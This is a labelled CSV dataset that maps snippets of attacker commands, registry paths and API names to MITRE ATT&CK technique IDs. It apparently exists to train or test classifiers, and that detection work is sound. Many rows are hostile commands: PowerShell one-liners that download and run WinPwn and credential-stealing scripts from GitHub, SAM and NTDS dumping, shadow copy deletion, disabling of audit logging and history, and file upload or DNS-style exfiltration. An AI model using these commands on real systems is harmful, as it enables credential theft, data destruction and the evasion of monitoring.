command,mitre_id
"$(dirname ""$(pwd -P)"")",T1083
pktmon.exe start --etw -f %TEMP%\t1040.etl,T1040
winget.exe install --manifest {PATH:.yml},T1105
"&""$PathToAtomicsFolder\T1056.001\src\Get-Keystrokes.ps1"" -LogPath $filepath",T1056
csc.exe -out:{PATH:.exe} {PATH:.cs},T1127
/home/runtime/logs,T1070
echo $ENCODED > $encoded_file && xxd -r -p $encoded_file,T1140
"echo ""https://akira.onion"" >> $env:Userprofile\Desktop\akira_readme.txt",T1486
/var/run,T1027
March 25 rcs.docx,T1036
/Library/Preferences/com.apple.loginwindow.plist,T1037
cacls.exe,T1222
TestWindowRemoteAgent.exe start -h {your-base64-data}.example.com -p 8000,T1048
"echo ""RDP connection established""",T1021
$env:COR_ENABLE_PROFILING = 1,T1574
echo Requesting SYSVOL:,T1558
dscl . -passwd /Users/AtomicUser mySecretPassword,T1078
C:\windows\temp\,T1074
touch -r <filename> <filename>,T1070
"Get-ChildItem -Path ""$UserDir""",T1546
/domain,T1087
security find-generic-password -wa wifiname,T1016
/success,T1562
New-Item -ItemType Directory -Path $Copy | Out-Null,T1560
GetNetworkParams,T1106
HKLM\SOFTWARE\Plus,T1027
‘HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\BootExecute’,T1112
coregen.exe /L {PATH_ABSOLUTE:.dll} dummy_assembly_name,T1055
certctl rehash,T1553
rasautou -d {PATH:.dll} -p export_name -a a -e e,T1218
HKEY_USERS\Software\Microsoft\Windows\CurrentVersion\Run vpdn “%ALLUSERPROFILE%\%APPDATA%\vpdn\VPDN_LU.exe”,T1547
generaldomaininfo -noninteractive -consoleoutput,T1087
.xcassets,T1564
auditctl -e 0,T1562
"mkdir ""\\?\C:\Windows \System32\""",T1548
dlsym(),T1129
DeleteFileA,T1070
cp $HISTFILE $HISTFILE.OLD,T1562
HKCR\http\shell\open\command,T1012
file /bin/pwd,T1083
"rundll32.exe {PATH_SMB:.dll},EntryPoint",T1218
"Write-Host ""Waiting 10s before putting $processName in the comma"" -ForegroundColor Yellow",T1562
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'),T1003
wget,T1105
touch $target_filename,T1070
OpenEventLog/ClearEventLog APIs,T1070
ls -la /tmp/art.txt,T1059
CheckIfInstallable method execution test failure. Installer assembly execution output did not match the expected output.,T1218
explorer.exe {PATH_ABSOLUTE:.exe},T1202
dotnet.exe fsi,T1059
"$ShortCut.Description = ""T1547.009."";",T1547
Start-Process $MSP360_Connect_Path,T1219
"Invoke-MalDoc -macroFile ""PathToAtomicsFolder\T1053.005\src\T1053.005-macrocode.txt"" -officeProduct ""$ms_product"" -sub ""Scheduler""",T1053
"New-Item -ItemType Key -Path ""HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run""",T1547
chown root $file_to_setuid,T1548
fsi.exe {PATH:.fsscript},T1059
C:\Users\Public\Documents\Flash\,T1564
Xxsh,T1059
echo $(openssl passwd -1 art) | pw mod user testuser1 -h 0,T1078
"New-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name DefaultDomainName -Value contoso.com -Force",T1562
"find $file_path/.azure -name ""msal_token_cache.json"" -o -name ""accessTokens.json"" -type f 2>/dev/null",T1552
"Write-Host ""32-bit Office""",T1137
"reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"" /v AutoShareWks /t REG_DWORD /d 0 /f",T1070
"net user ""$username"" ""$password"" /add /domain",T1136
PrintBrm -r -f {PATH_ABSOLUTE}:hidden.zip -d {PATH_ABSOLUTE:folder},T1564
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\App and Browser protection"" /v ""DisallowExploitProtectionOverride"" /t REG_DWORD /d ""0"" /f >NUL 2>nul",T1562
$which_python $python_binary_name,T1059
"get-process | ?{$_.Description -like ""*defender*""}",T1518
{if($_.Exception.Response -ne $null),T1619
dd of=$file_to_overwrite if=$overwrite_source count=$(ls -l $file_to_overwrite | awk '{print $5}') iflag=count_bytes,T1485
"$resourceAccess.Type = ""Role""",T1098
powershellsensitive -consoleoutput -noninteractive,T1552
user locale of (get system info),T1614
/data2/.bd.key/authd,T1574
Microsoft.NodejsTools.PressAnyKey.exe normal 1 {PATH:.exe},T1127
shutdown /r /t $timeout,T1529
ldapdomaindump -u $username -p $password $target_ip -o /tmp/T1087,T1087
New-Item -Path $SilentProcessExit -Force,T1546
ZwLoadDriver(),T1543
sudo kextload $module_path,T1547
Get-GPPPassword -Verbose,T1552
Wow64SetThreadContext,T1106
"Set-ItemProperty ""HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\atomic_test"" ""(Default)"" ""ART TEST"" -Force",T1547
"Copy-Item ""$PathToAtomicsFolder\T1547.003\bin\AtomicTest.dll"" C:\Users\Public\AtomicTest.dll",T1547
Remove-Item $env:TEMP\silver.bat -ErrorAction Ignore,T1558
echo $ENCODED > $encoded_file && base64 -d $encoded_file,T1140
"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass -noprofile ""$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('$url');$Xml.command.a.execute | IEX""",T1059
"HKEY_CURRENT_USER \Software\Microsoft\Windows\CurrentVersion\Run\”vert” = “rundll32.exe c:\windows\temp\pvcu.dll , Qszdez”",T1218
"Copy-Item ""$PathToAtomicsFolder\T1547.012\bin\AtomicTest.dll"" C:\Windows\System32\spool\prtprocs\x64\AtomicTest.dll",T1547
echo $ENCODED > $encoded_file && cat $encoded_file | xxd -r -p,T1140
/tmp/WhiteChocolateMacademiaNut/chocolate -d cookies -p 1337,T1539
esxcli software vib install --force,T1505
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1'),T1548
touch /var/tmp/T1564.001_mac.txt,T1564
xattr -p,T1564
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load,T1012
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMPIN /t REG_DWORD /d 2 /f",T1112
shred -u $file_to_shred,T1070
KERBEROS::PTT,T1550
"echo ""e"" > /proc/sysrq-trigger",T1489
RtlCreateUserThread,T1055
screencapture,T1113
Get-WmiObject win32_bios,T1082
if (-not (Test-Path $dirPath)) { New-Item -ItemType Directory -Path $dirPath -Force | Out-Null },T1562
argv[0],T1036
"Write-Output ""Found blob: $($blob)""",T1619
$decodedString | Out-File $env:temp\T1027.013_decodedEicar.txt,T1027
Get-WMIObject Win32_Group,T1069
systeminfo.exe,T1082
Mega.co.nz,T1567
LC_LOAD_WEAK_DYLIB,T1574
Muraena,T1539
"sudo lsmod | grep -i ""vboxsf\|vboxguest""",T1082
ldd,T1574
HKCU\Software\ApplicationContainer\Appsw64,T1112
"taskName = ""OpenCalcTask""",T1137
reg add “HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon”,T1547
echo $bash_encoded | base64 -d | bash,T1140
ImpersonateNamedPipeClient,T1134
user1 ALL=(ALL) NOPASSWD: ALL,T1548
"rundll32.exe advpack.dll,LaunchINFSection {PATH:.inf},,1,",T1218
cd $working_dir,T1105
LoadAppInit_DLLs,T1546
Put,T1105
"rundll32.exe url.dll,OpenURL {PATH_ABSOLUTE:.hta}",T1218
officeupdate.exe,T1053
$which_python $python_script_name,T1059
OfflineScannerShell,T1218
"New-ItemProperty ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" -Name LocalAccountTokenFilterPolicy -PropertyType DWord -Value 1 -Force",T1112
"Copy-Item ""$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"" -Destination ""PathToAtomicsFolder\..\ExternalPayloads\Edge"" -Force -Recurse",T1555
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\sibot,T1027
unset HISTIGNORE,T1562
start-sleep -s 15,T1218
"$web_client.UploadFile($uri, $file.FullName)}}",T1048
systemctl,T1562
Get-NetIPAddress,T1016
NT AUTHORITY\SYSTEM,T1134
"SystemParametersInfo(20,0,thePath,3);",T1491
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoPropertiesMyDocuments /t REG_DWORD /d 1 /f",T1112
pyminifier,T1027
al-khaser,T1497
net accounts (/domain),T1201
vssadmin.exe list shadows,T1082
winmail.dat,T1036
openssl,T1140
New-PSSession -ComputerName $hostname_to_connect,T1059
ntdsutil.exe,T1003
/.local/share/keyrings,T1555
"if [ ""$(uname)"" = 'FreeBSD' ]; then service -e; else systemctl --type=service; fi;",T1007
Remove-CimSession -CimSession $CimSession,T1546
"reg query HKLM\system\currentcontrolset\services /s | findstr ImagePath 2>nul | findstr /Ri "".*\.sys$""",T1012
dllhost.exe,T1546
ps aux | egrep 'Little\ Snitch|CbOsxSensorService|falcond|nessusd|santad|CbDefense|td-agent|packetbeat|filebeat|auditbeat|osqueryd|BlockBlock|LuLu',T1518
"systemd-run --unit=Atomic-Red-Team --on-calendar '*:0/1' /bin/sh -c 'echo ""$(date) $(whoami)"" >>/tmp/log'",T1053
"$sheet.Cells.Item(21,1) = ""=WAIT(NOW()+`""00:00:05`"")""",T1204
UILanguage = Get-WinUILanguageOverride,T1614
AVCaptureStillImage,T1113
& $env:SYSTEMROOT\system32\runonce.exe /AlternateShellStartup,T1547
"C:\Windows\System32\cmd.exe /c net group ""Domain Admins"" /domain",T1087
ImpersonateLoggedOnUser,T1134
WinHttpGetIEProxyConfigForCurrentUser(),T1090
New-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\Filesystems\NTFS -Name SymlinkRemoteToRemoteEvaluation -PropertyType DWORD -Value 1 -Force -ErrorAction Ignore,T1222
.report,T1497
GetIpAddrTable,T1016
install.log,T1562
"$tr.Add(""[AccessDenied] $root"")",T1083
.basta,T1486
%APPDATA%\OneDrive.bat,T1059
"Start-Process ""$dirlister_path""",T1083
setres.exe -w 800 -h 600,T1218
"msiexec /i {PATH_ABSOLUTE:.msi} TRANSFORMS=""{REMOTEURL:.mst}"" /qb",T1218
"echo ""[*] Listing SysV init scripts (/etc/init.d):""",T1007
taskkill -f -im win32calc.exe,T1218
wallpaper.mp4,T1036
cp ${FILE} /tmp/t1547007_loginwindow-backup.plist,T1547
atbroker /start malware_test,T1546
$tcp.Close(),T1046
"sudo sed -i """" ""$indexs,^,$pam_rule\n,g"" $path_to_pam_conf",T1556
"Copy-Item -Path $termsrvDll -Destination ""$HOME\AtomicTest.dll""",T1505
procdump,T1003
takeown /F C:\Windows\System32\Magnify.exe /A,T1546
"reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"" /v ProxyServer /t REG_SZ /d ""proxy.atomic-test.com:8080"" /f",T1112
GetlogicalDrives,T1680
"ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);",T1562
findmnt -t nfs,T1083
HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run,T1547
mpnotify.exe,T1556
exe,T1574
%temp%\Downloads,T1074
"ysoserial.exe -o raw -f BinaryFormatter - g DataSet -c ""{CMD}"" > RecentViews & copy RecentViews %LOCALAPPDATA%\Microsoft\EventV~1\RecentViews & eventvwr.exe",T1548
HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run\AdobelmdyU,T1547
"""$file_name""",T1562
"if ($value -eq ""1"")",T1137
get-aduser -filter *,T1087
"Start-Process ""$nsudo_path"" -Argument ""-U:T -P:E cmd""",T1134
GetComputerName,T1082
tracert -h 5 -4 google.com,T1016
if [ -f /usr/local/etc/sudoers ]; then sudo cat /usr/local/etc/sudoers > $output_file; fi;,T1087
"foreach ($ip in 1..255 | % { ""$firstOctet.$secondOctet.$thirdOctet.$_"" } ) {cmd.exe /c nslookup $ip}",T1018
"if (Test-Path ""C:\Users\Default\AppData\Local\Temp\hello.log"") { Remove-Item ""C:\Users\Default\AppData\Local\Temp\hello.log"" -Force; Write-Host ""[+] hello.log removed."" }",T1027
"""$uacme_exe""",T1548
"rundll32.exe zipfldr.dll,RouteTheCall ""$exe_to_launch""",T1218
VirtualAlloc,T1106
contentsOfDirectoryAtPath,T1106
HKCU\Software\Microsoft\Office\,T1112
"$sheet.Cells.Item(17,1) = ""=FWRITELN(A5, `""oStream.Close`"")""",T1204
%WINDIR%\SYSTEM32\oci.dll,T1574
WantedBy=multi-user.target,T1543
fsutil behavior set SymlinkEvaluation R2L:1,T1222
/etc,T1546
AllowReversiblePasswordEncryption,T1556
cat $output_file,T1003
"Rundll32.exe apphelp.dll,ShimFlushCache",T1112
"if (-not (Test-Path -Path""$env:TEMP\t1003.001-13-rdrleakdiag"")) {New-Item -ItemType Directory -Path $env:TEMP\t1003.001-13-rdrleakdiag -Force}",T1003
api_paste_code = $content,T1567
%appdata%\Roaming\Microsoft\Templates\,T1053
systemctl disable,T1569
powershell.exe -ep bypass -ec IgBXAGUAIAA8ADMAIABMAE8ATABCAEEAUwAiAA==,T1059
tcpdump -c 5 -nnni $interface,T1040
COR_ENABLE_PROFILING,T1574
ucmDccwCOMMethod,T1548
"Write-Output ""Shared key access is disabled for this storage account.""",T1528
"ntdsutil ""ac i ntds"" ""ifm"" ""create full $output_folder"" q q",T1003
"Send-MailMessage -From $sender -To $receiver -Subject ""T1048.003 Atomic Test"" -Attachments $input_file -SmtpServer $smtp_server",T1048
/usr/lib/udev/rules.d/,T1546
CreateDesktop(),T1564
"Set-ItemProperty ""HKCU:\software\classes\ms-settings\shell\open\command"" -Name ""(default)"" -Value ""$executable_binary"" -Force",T1548
pwd.py,T1083
.\kerbrute.exe bruteuser --dc $domaincontroller -d $domain $env:temp\bruteuser.txt TestUser1,T1110
"if ($subscription -eq $null) { Write-Warning ""Subscription not found""; exit }",T1098
echo 3> /proc/sys/vm/drop_caches,T1562
uploaddd,T1005
IEX (IWR 'https://raw.githubusercontent.com/TriggerMan-S/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-PasswordVaultCredentials -Force,T1555
Remove-SmbShare -Name $share_name,T1070
"cd ""$rsp_file_path""",T1218
svehost.exe,T1036
HelpAssistant,T1036
bash_history,T1552
/bin/authd,T1574
RequireSigned,T1553
grepWinNP3.exe,T1574
"set-itemproperty $RunOnceKey ""NextRun"" '$thing_to_execute ""IEX (New-Object Net.WebClient).DownloadString(`""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`"")""'",T1547
findstr /S /I cpassword \\sysvol\policies\*.xml,T1552
"Copy-Item ""$PathToAtomicsFolder\T1547.001\src\vbsstartup.vbs"" ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs""",T1547
Dim schTasksCmd As String,T1137
Get-RegistryAutoLogon,T1552
HKCU\Software\dnimtsoleht\StubPath,T1547
OpenService,T1543
"New-NetFirewallRule -DisplayName ""New rule"" -Direction ""$direction"" -LocalPort ""$local_port"" -Protocol ""$protocol"" -Action ""$action""",T1562
$requiredResourcesAccess.Add($requiredGraphAccess),T1098
service art-test start,T1543
FileShareName = $fileShare,T1619
ls.py,T1083
public const uint TOKEN_QUERY = 0x0008;,T1562
curl -O $remote_url/gta.db,T1005
"echo ""Atomic Red Team TEST"" > %APPDATA%\Microsoft\Outlook\VbaProject.OTM",T1137
HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce,T1547
/etc/emond.d/rules/,T1546
"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:$output_file ""$input_file""",T1027
reg save HKLM\sam %temp%\sam,T1003
foreach ($row in $storage_account_objects) {,T1530
"Copy-Item -Path ""C:\Windows\System32\termsrv.dll"" -Destination ""C:\Windows\System32\termsrv_backup.dll"" -ErrorAction Ignore",T1505
hidcon,T1564
"rundll32.exe desk.cpl,InstallScreenSaver {PATH_SMB:.scr}",T1218
su -c whoami art,T1078
/proc/*/environ,T1083
Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=$uac_prop)' -Server $domain,T1087
IVssBackupComponents,T1490
IF NOT EXIST C:\Windows\System32\sethc_backup.exe (copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc_backup.exe) ELSE ( pushd ),T1546
sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.defense.daemon.plist,T1562
SetLastError,T1106
echo 'source = session.get(url).content' >> $python_script_name,T1059
sigverif.exe,T1218
rm ~/.bash_history,T1070
WScript.Sleep,T1497
connect-mggraph -AccessToken $token,T1114
"if [ -x ""$(command -v netstat)"" ]; then $cmd | awk '{print $NF}' | grep -v '[[:lower:]]' | sort | uniq -c; else echo ""netstat is missing from the machine. skipping...""; fi;",T1016
"Import-Module ""PathToAtomicsFolder\..\ExternalPayloads\PowerDump.ps1""",T1003
env | grep LANG,T1614
xsd.exe {REMOTEURL},T1105
C:\Program Files\Common Files\System\Ole DB\,T1074
touch -acmr $reference_file_path $target_file_path,T1070
OutputAssemblyFileName = $InstallerAssemblyFileName,T1218
echo $ENCODED > $encoded_file && cat $encoded_file | b64decode -r,T1140
PR_DELETE_AFTER_SUBMIT,T1070
"for /F ""tokens=1,2"" %i in ('qwinsta /server:$computer_name ^| findstr ""Active Disc""') do @echo %i | find /v ""#"" | find /v ""console"" || echo %j > computers.txt",T1033
"""$rar_exe"" a -hp""blue"" hello.rar",T1560
"[System.Reflection.Assembly]::LoadWithPartialName(""System.DirectoryServices.Protocols"") | Out-Null",T1110
Aqua,T1543
fsi.exe,T1059
"$which_python -c ""import pty;pty.spawn('/bin/bash')""",T1059
iptables-save > /tmp/iptables.rules,T1562
pslist,T1057
for ($var = 1; $var -le $lockout_threshold; $var++) {,T1110
IsDebuggerPresent,T1622
Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();},T1490
HH.exe {REMOTEURL:.bat},T1105
"Stop-Process -Name ""WinWord""",T1137
rc.common,T1037
Underlay-Copy -Mode MFT -SourceFile C:\Windows\System32\config\SYSTEM -DestinationFile $extract_path\SYSTEM_HIVE,T1003
powershell -ep RemoteSigned -f .\Launch-VsDevShell.ps1 -VsWherePath {PATH_ABSOLUTE:.exe},T1216
key4.db,T1552
"python3 -c ""import base64;dec=base64.b64decode(\""$ENCODED\"");print(dec.decode())""",T1140
"HKCU\Software\Microsoft\Windows\CurrentVersion\Run, Spotify =% APPDATA%\Spotify\Spotify.exe",T1547
"REG ADD ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist"" /v $user_name$ /t REG_DWORD /d 0",T1564
&lt;GPO_PATH&gt;\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml,T1484
netstat -anop tcp,T1049
stari.txt,T1074
"echo ""$script_command"" > $script_path",T1037
$which_7z a -p$pwd_for_encrypted_file $encrypted_file_path $input_file_path,T1486
"Write-Host ""Creating registry keys in HKCU:Software\Classes\CLSID\$clsid_guid"" -ForegroundColor Cyan",T1574
findstr /V /L W3AllLov3LolBas {PATH_ABSOLUTE:.exe} > {PATH_ABSOLUTE}:file.exe,T1564
nslookup myip.opendns.comresolver1.opendns.com\r\n,T1016
bginfo.exe {PATH:.bgi} /popup /nolicprompt,T1218
if (!$Computer) { Continue },T1018
cp $calc_plist_path ~/Library/Preferences/ByHost/com.apple.loginwindow.plist,T1547
"odbcconf.exe -f ""$rsp_file_name""",T1218
"Set-ItemProperty ""HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"" ""Authentication Packages"" $AuthenticationPackagesValues",T1556
"New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"" -Name ShellSmartScreenLevel -Force",T1484
sudo /Library/StartupItems/atomic.sh start,T1037
ComputerDefaults.exe,T1548
net,T1087
if (Test-Path $extractFolder) {,T1562
"rundll32.exe shdocvw.dll,OpenURL {PATH_ABSOLUTE:.url}",T1218
SysListView32,T1055
cliconfig.exe,T1548
$completeMessage.Append($receivedString),T1539
Start-Process -Wait $file1 /S;,T1219
NSFileManager,T1083
HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{6afa8072-b2b1-31a8-b5c1-{Unique Identifier},T1547
"wmic process get Capture, ExecutablePath",T1057
public static void SetWallpaper(string thePath){,T1491
reg query hklm\software\,T1012
if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id },T1003
"Write-Host ""Registry key created: $registryPath""",T1562
[System.Runtime.InteropServices.Marshal]::ReleaseComObject($document) | Out-Null,T1137
"cmd /c '$sharp_path' /ldap:all | out-file -filepath ""$output_path""",T1135
init,T1036
chflags nosimmutable $file_to_modify,T1222
dir d:\ >> %temp%\download,T1083
"Get-Item -Path ""HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad""",T1012
net stop,T1489
authd,T1055
BootExecute,T1547
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoClose /t REG_DWORD /d 1 /f",T1112
remover.bat,T1070
"""$vboxmanage_exe"" startvm ""$vm_name""",T1564
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore"" /v ""DisableSR"" /t ""REG_DWORD"" /d ""1"" /f",T1490
"Write-Host ""Error: domain """"$domain_name"""" already federated. Try with a different domain or re-create it before.""",T1484
